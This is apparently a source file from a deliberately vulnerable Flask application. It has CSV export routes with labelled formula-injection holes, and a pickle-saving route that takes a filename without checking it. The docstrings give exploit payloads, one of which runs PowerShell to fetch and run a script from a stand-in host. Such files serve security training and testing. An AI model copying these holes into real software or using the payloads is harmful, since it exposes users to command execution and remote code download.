"""Export views with CSV injection

VULNERABILITIES:
- CSV Formula Injection
"""

from flask import Blueprint, request, jsonify, Response
from ..services.export_service import ExportService
from ..services.pickle_service import PickleService
import os

export_bp = Blueprint('export', __name__)


@export_bp.route('/csv', methods=['POST'])
def export_csv():
    """VULN: CSV Formula Injection
    CVE Reference: CVE (Knockpy CSV injection), CVE (dirsearch CSV injection)
    
    Exploit: POST {"data": [["=cmd|'/c calc'!A1", "test"]], "headers": ["Formula", "Data"]}
    """
    data = request.json.get('data', [])
    headers = request.json.get('headers')
    
    # VULN: No sanitization - CSV formula injection
    csv_content = ExportService.export_to_csv(data, headers)
    
    return Response(
        csv_content,
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment;filename=export.csv'}
    )


@export_bp.route('/csv-formula', methods=['POST'])
def export_with_formula():
    """VULN: Intentionally adds formula column
    CVE Reference: Similar to knockpy/dirsearch vulnerabilities
    
    Exploit: POST {"data": [["A", "B"]], "formula": "=cmd|'/c powershell IEX(wget evil.ps1)'"}
    """
    data = request.json.get('data', [])
    formula = request.json.get('formula', '=SUM(A1:A10)')
    
    # VULN: Adds malicious formula
    csv_content = ExportService.export_with_formula(data, formula)
    
    return Response(
        csv_content,
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment;filename=report.csv'}
    )


@export_bp.route('/model', methods=['POST'])
def save_model():
    """Save model as pickle file
    CVE Reference: CVE-2022-34668 (NVFLARE)
    """
    model_data = request.json.get('model')
    filename = request.json.get('filename', 'model.pkl')
    
    from flask import current_app
    filepath = os.path.join(current_app.config['UPLOAD_FOLDER'], filename)
    
    # Save using pickle
    PickleService.save_model(model_data, filepath)
    
    return jsonify({"success": True, "filepath": filepath})
